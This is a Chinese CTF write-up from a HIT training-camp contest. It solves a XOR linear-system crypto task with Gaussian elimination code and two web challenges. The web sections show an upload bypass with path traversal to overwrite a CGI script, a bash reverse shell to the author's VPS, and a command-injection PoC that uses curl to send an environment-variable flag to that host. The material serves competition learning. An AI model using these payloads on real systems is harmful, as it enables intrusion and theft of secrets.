# HIT青训营结营比赛Writeup


## 0x01 签到

没什么好说的

## 0x02 mix

这题大概的意思是给一个128*128的数组，找出其中异或和为1（128位全为1）的某些行。这里直接搜索的话大概要$2^{128}$肯定算不出来。由于flag的中间部分是128位二进制数，我们假设这128位为$x_0x_1...x_{127}$，将数组的第i行第j列设为$a_{ij}$，那么可以列出以下方程组：

$a_{11}x_1⊗a_{12}x2⊗...a_{1_{127}}x_{127}=1 $

$a_{21}x_1⊗a_{22}x2⊗...a_{2_{127}}x_{127}=1 $

……

$a_{i1}x_1⊗a_{i2}x2⊗...a_{i_{127}}x_{127}=1 $

……

这就可以看做一个异或方程组，增广矩阵是$[a^T,1]$（为什么要转置：是因为实际上是原数组每一列和flag相乘）。那么此时就可以使用高斯消元解出**唯一**的$x$解。首先使用python将$a$转置：

```python
A = A.splitlines()

def invert_row(row):
    return ''.join('0' if ch == '1' else '1' for ch in row)

def invert_matrix(A):
    return [invert_row(row) for row in A]

def mix(a, b):
    return ''.join('0' if x == y else '1' for x, y in zip(a, b))

int_A = [[int(char) for char in row] for row in A]

for i in range(128):
    for j in range(128):
        print(int_A[j][i],end=' ')
```

得到的结果储存在in.txt中，然后高斯消元求解：

```c++
#include <iostream>
#include <cstdio>
#include <cstring>

using namespace std;

const int N = 130;

int n;
int a[N][N];

int gauss()
{
    int r, c;
    for(r = 0, c = 0; c < n; c ++) {
        int t = r;
        for(int i = r; i < n; i ++) {
            if(a[i][c]) {
                t = i;
                break;
            }
        }
        if(!a[t][c]) continue;
        for(int i = c; i < n + 1; i ++) swap(a[r][i], a[t][i]);
        for(int i = r + 1; i < n; i ++) {
            if(a[i][c]) {
                for(int j = n; j >= c; j --) {
                    a[i][j] ^= a[r][j];
                }
            }
        }
        r ++;
    }
    if(r < n) {
        for(int i = r; i < n; i ++) {
            if(a[i][n]) {
                return 2;
            }
        }
        return 1;
    }
    for(int i = n - 1; i >= 0; i --) {
        for(int j = i + 1; j < n; j ++) {
            a[i][n] ^= a[j][n] & a[i][j];
        }
    }
    return 0;
}

int main()
{
    freopen("in.txt", "r", stdin);
    n = 128;
    for(int i = 0; i < n; i ++) {
        for(int j = 0; j < n; j ++) {
            scanf("%d", &a[i][j]);
        }
    }
    for (int i = 0;i < n;++i) {
        a[i][128] = 1;
    }	//增广矩阵
    int t = gauss();
    if(!t) for(int i = 0; i < n; i ++) printf("%d", a[i][n]);
    else if(t == 1) puts("Multiple sets of solutions");
    else puts("No solution");
    fclose(stdin);
    return 0;
}
```

得到唯一解：`11100010101100110011111101010001111010000110000100101101010110110110110011000110111101111101111110111011101011001010101101101011`，由题目中的正则表达式得到，flag中为10进制的39位数字，转化后得到：`301336232466272917408453747777662135147`，刚好是39位，带入原题验证，成功解出flag。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126102128456.png)

## 0x03 Yesterday Once More               

![image-20240126153928216](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126153928216.png)

打开图片发现，其中的图片是通过readfile.cgi文件显示的，而且由题目可知，我们可以查看/usr/local/apache2/htdocs/cgi-bin/文件夹下的内容。于是，发现了index.cgi文件的源码。![image-20240126154052479](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126154052479.png)

```bash
#!/bin/bash

echo "Content-type: text/html"
echo ""

cat <<EOF
<!doctype html>
<html lang="en" data-theme="dark">
……
```

实际上是一个bash脚本，那我们也可以传上一个脚本来获得shell。可是直接上传的文件名会被重置为随机数。通过对处理上传的程序update.cgi进行逆向可知，如果上传文件的类型为hack/lilac则可以绕过文件名重置。

![image-20240126154447531](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126154447531.png)

于是可以成功上传cgi文件。但此时访问则会显示500错误。猜测原因是上传的文件没有执行权限。在测试上传路径时候发现，可以通过`..`路径穿越上传到父文件夹。于是，想到覆盖有权限的文件，也就是index.cgi、readfile.cgi或upload.cgi这三个文件。但是覆盖后两者风险比较大，可能无法继续往后做题，于是选择覆盖index.cgi，同时需要注意在linux中完成，因为windows和linux的换行符不一样。

这里选择直接将index.cgi下载下来，（通过readfile.cgi文件），然后在其中加入以下语句：

```bash
bash -i >& /dev/tcp/124.223.190.186/9355 0>&1
```

124.223.190.186是本人的vps地址，这里反弹shell纯粹是为了省事一点，不然每改一次命令就需要重新上传文件。

![image-20240126171647774](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126171647774.png)

成功之后，访问index.cgi，成功得到shell。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126172105205.png)

根据提示，第一个flag在根目录，直接cat /flag解得第一个flag。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126172159579.png)

> 第二问确实是需要提权的，当时一直以为是suexec提权，其实不是，所以一直没做出来。最后的答案就在root的1进程中的环境变量中。

## 0x04 bad_calculator

首先随便计算一个结果然后抓包，发现是在calc接口带入expr参数进行计算的：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126165709319.png)

那么首先想到的就是RCE。首先尝试了直接使用;和&&断句，发现没有成功。

这时想到bc的一般用法应该是`echo "3*5" | bc`，于是尝试闭合引号，这里试了两种引号，只有双引号可以。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126170141981.png)

此时想直接ls看看文件，发现出来的一大堆数字：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126170245927.png)

然后echo了一些东西，发现字母是不能输出的。

此时没有思路了，想着reverse shell到自己的VPS试一下，结果使用bash直接建立tcp连接失败了。而且不清楚原因。

偶然间试了下curl发现竟然可以收到GET请求。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126170533965.png)

题目提示是环境变量，那么试一试能不能带点东西出来，首先试下$PATH，发现可以。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126170651608.png)

但是，flag在什么环境变量里面了？根据测试赛和以往的经验，我依次尝试了flag、FLAG、FLAG1最终FLAG1成功带出flag。

![image-20240126215700933](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20240126215700933.png)

最终Poc如下所示

```
http://camp.hitctf.cn:25657/calc
?expr=a";curl http://124.223.190.186:9355/${FLAG1};echo "5*4
```



---

> 作者: alextang  
> URL: https://alextang.top/articles/2024/01/hitctfwriteup/  

